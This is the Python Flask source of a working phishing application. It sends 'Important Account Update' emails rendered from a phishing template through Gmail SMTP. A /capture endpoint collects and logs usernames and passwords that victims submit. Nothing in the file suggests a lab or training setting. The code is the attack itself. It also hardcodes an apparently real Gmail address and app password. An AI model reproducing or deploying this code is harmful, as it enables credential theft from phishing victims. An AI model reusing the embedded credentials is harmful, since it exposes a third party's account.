import os
from flask import Flask, render_template, request, redirect, url_for, session
from flask_mail import Mail, Message

app = Flask(__name__)

# Set a secret key for session management
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your_secret_key')

# Configure Flask-Mail with Gmail SMTP server
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False
app.config['MAIL_USERNAME'] = 'denveremily520@gmail.com'  #  Gmail address
app.config['MAIL_PASSWORD'] = 'mduc azhu jjdn pgcb'  #the App Password generated from Google

mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Store credentials securely in the session
    session['MAIL_USERNAME'] = email
    session['MAIL_PASSWORD'] = password

    print(f"Credentials set for: {email}")  # Logging safely

    return redirect(url_for('index'))  # Redirect to the main page after login

@app.route('/send_email', methods=['POST'])
def send_email():
    if 'MAIL_USERNAME' not in session or 'MAIL_PASSWORD' not in session:
        return "Error: Please log in to set your email credentials.", 403

    recipient = request.form['email']
    print(f"Sending phishing email to: {recipient}")

    msg = Message("Important Account Update", sender=session['MAIL_USERNAME'], recipients=[recipient])
    msg.html = render_template('phishing_email.html')

    try:
        mail.send(msg)
        print(f"Email sent to {recipient}!")
        return "Email sent!"
    except Exception as e:
        print(f"Error sending email: {e}")
        return f"Error: {str(e)}", 500

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form['username']
    password = request.form['password']
    print(f"Captured credentials - Username: {username}, Password: {password}")

    # After capturing the credentials, you can redirect or display a success page
    return redirect(url_for('index'))

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()  # Clear all session data
    return redirect(url_for('index'))  # Redirect back to the homepage

if __name__ == '__main__':
    app.run(debug=True, port=5003)  # You can change to port 5003 or any available port
